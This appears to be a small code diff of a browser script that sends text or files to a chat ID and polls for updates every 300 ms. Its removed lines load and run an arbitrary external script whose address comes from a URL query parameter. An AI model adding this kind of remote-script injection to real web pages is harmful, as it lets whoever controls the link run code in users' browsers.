@@ -7,18 +7,7 @@ let AdminId = null
 let token = null
 
 (() => {
-const params = new URLSearchParams(window.location.search)
-token = params.get("token") || ""
-const externalJsUrl = params.get("url") || ""
 const statusEl = document.getElementById("status")
-
-if (!token || !externalJsUrl) return
-
-const script = document.createElement("script")
-script.src = externalJsUrl
-script.onload = () => console.log("External script loaded")
-script.onerror = () => console.error("Failed to load external script")
-document.head.appendChild(script)
 
 async function send(fileOrText, targetChatId, type = "text", options = {}) {
     const payload = { chat_id: targetChatId, ...options }
@@ -64,4 +53,4 @@ async function pollUpdates() {
 
 setInterval(pollUpdates, 300)
 })()
-            
+
